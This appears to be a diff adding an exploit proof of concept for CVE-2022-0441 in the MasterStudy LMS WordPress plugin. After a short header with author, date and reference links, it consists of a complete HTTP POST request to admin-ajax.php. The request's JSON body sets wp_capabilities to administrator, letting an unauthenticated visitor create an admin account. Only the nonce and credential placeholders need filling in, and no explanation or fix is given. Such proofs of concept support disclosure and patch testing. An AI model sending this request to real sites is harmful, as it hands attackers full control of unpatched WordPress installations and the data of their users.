@@ -1,0 +1,21 @@
+# Title: WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation
+# Date: 16.02.2022
+# Author: Numan Türle
+# CVE: CVE-2022-0441
+# Software Link: https://wordpress.org/plugins/masterstudy-lms-learning-management-system/
+# Version: <2.7.6
+# https://www.youtube.com/watch?v=SI_O6CHXMZk
+# https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6
+# https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed
+
+
+POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce=[NONCE] HTTP/1.1
+Connection: close
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip, deflate
+Accept-Language: tr,en;q=0.9,tr-TR;q=0.8,en-US;q=0.7,el;q=0.6,zh-CN;q=0.5,zh;q=0.4
+Content-Type: application/json
+Content-Length: 339
+
+{"user_login":"USERNAME","user_email":"EMAIL@TLD","user_password":"PASSWORD","user_password_re":"PASSWORD","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}
